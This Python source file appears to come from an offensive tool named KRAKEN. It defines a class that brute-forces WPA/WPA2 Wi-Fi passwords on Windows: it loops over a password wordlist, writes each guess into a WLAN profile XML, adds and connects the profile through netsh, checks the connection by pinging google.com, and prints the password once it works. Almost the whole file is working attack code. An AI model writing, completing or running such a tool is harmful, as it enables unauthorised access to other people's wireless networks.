from Utilities.DiccionariesPATH.paths import filtered_payloads
import os
import re
import time
import colorama
from colorama import Cursor, Fore

# 1 Package x 0.5 seconds... Its very slow
class Brute_Force_WPA_v1():
    def __init__(
        self,
        wifi_name,
        wifi_new_payload
    ) -> None:
        # ---------------------------------------------------------------------------------------------------
        # Init variables
        # Obligatory variables
        self.wifiName = wifi_name if wifi_name is not None else exit(
            "[-] ERROR: No has WIFI NAME...")
        # Automatic variables
        self.payloadPATH = filtered_payloads["wpa"]
        self.payloadArray = None
        # Optional variables
        self.loadPayload = wifi_new_payload

        # Function variables
        # Params
        self.infrastructure = None
        self.authentication = None
        self.encryption = None

        # XML Profile
        self.configXML = None
        self.nameXLM = "XML.xml"

        # Verify's variables
        self.verify_CreateProfile = None
        self.verify_ConnectionRequest = None

        # Temp variables
        self.payloadTemp = None
        self.attemps = 0

        # ---------------------------------------------------------------------------------------------------
        # Init functions
        self.extractPayload()
        self.__run()

    # 1-.
    def extractPayload(self):
        # If load payload of KRAKEN
        if (self.loadPayload == None):
            self.payloadArray = open(self.payloadPATH, "r")
        # If load other payload
        else:
            self.payloadArray = open(self.loadPayload, "r")

    # 2-.
    def verifyParams(self):
        wlan_command = "netsh wlan show networks interface = Wi-Fi"
        text = os.popen(wlan_command).read().split("SSID")

        for part in text:
            if re.search(self.wifiName, part):
                part = part.split("\n    ")
                # part[0] NOT IS A DATA

                self.infrastructure = part[1].split("Network type            : ")[
                    1].replace(" ", "").replace("\n", "")
                self.authentication = part[2].split("Authentication          : ")[
                    1].replace(" ", "").replace("\n", "")
                self.encryption = part[3].split("Encryption              : ")[
                    1].replace(" ", "").replace("\n", "")

    # 3-.
    def createXML(self, payload: str):
        self.payloadTemp = payload

        if self.encryption == "CCMP":
            self.configXML = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>WIFI-NAME</name>
    <SSIDConfig>
        <SSID>
            <name>WIFI-NAME</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>PAYLOAD</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>""".replace("WIFI-NAME", self.wifiName).replace("PAYLOAD", payload)
        elif self.encryption == "TKIP":
            self.configXML = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>WIFI-NAME</name>
    <SSIDConfig>
        <SSID>
            <name>WIFI-NAME</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>TKIP</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>PAYLOAD</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>""".replace("WIFI-NAME", self.wifiName).replace("PAYLOAD", payload)

    # 4-.
    def createWirelessProfile(self):
        file = open("XML", "w")
        file.write(self.configXML)
        file.close()

        # os.system('netsh wlan add profile filename="XML.xml" interface="Wi-Fi"')
        self.verify_CreateProfile = os.popen(
            "netsh wlan add profile XML").read().replace("\n", "")

    # 5-.
    def connectWirelessProfile(self):
        self.verify_ConnectionRequest = os.popen(
            f"netsh wlan connect name = {self.wifiName} ssid = {self.wifiName} interface = Wi-Fi").read().replace("\n", "")

    # 6-.
    def verifyConnection(self):
        if self.verify_CreateProfile == f"Profile {self.wifiName} is added on interface Wi-Fi.":
            if self.verify_ConnectionRequest == "Connection request was completed successfully.":
                time.sleep(0.5)
                ping = os.popen("ping google.com").read().replace("\n", "")

                if ping != "Ping request could not find host google.com. Please check the name and try again.":
                    os.system("cls")
                    response = f"{Fore.BLUE}Attemps: {Fore.YELLOW}{self.attemps} \n{Fore.MAGENTA}Password: {Fore.YELLOW}{self.payloadTemp}"
                    print(response)

                    os.remove("XML")
                    exit(1)
                else:
                    self.printInDisplay()

    # 6-.
    def printInDisplay(self):
        self.attemps = self.attemps + 1
        print(f"{Fore.YELLOW}{Cursor.UP(1)}{self.attemps} ")

    # INIT
    def __run(self):
        try:
            self.verifyParams()
            colorama.init(autoreset=True)
            print(f"{Fore.GREEN}Attemps:\n")

            for payload in self.payloadArray:
                payload = payload.replace("\n", "")
                self.createXML(payload)
                self.createWirelessProfile()
                self.connectWirelessProfile()
                self.verifyConnection()

        except KeyError as e:
            print(e)


# Try: 10 Packages x 0.25 seconds
class Brute_Force_WPA_v2():
    pass